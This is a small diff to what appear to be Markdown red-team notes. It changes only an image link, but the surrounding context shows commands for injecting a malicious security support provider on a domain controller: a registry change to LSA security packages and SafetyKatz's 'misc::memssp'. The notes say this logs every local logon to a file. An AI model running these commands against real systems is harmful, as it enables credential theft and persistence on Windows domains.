@@ -28,7 +28,7 @@ Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Pac
 `SafetyKatz.exe -Command '"misc::memssp"'`
 
 all local logons on the DC are logged to C:\Windows\system32\mimilsa.log
-![[assets/Pasted image 20260204062215.png]]
+![Pasted image 20260204062215](assets/Pasted%20image%2020260204062215.png)
 
 
 two main issues with this method
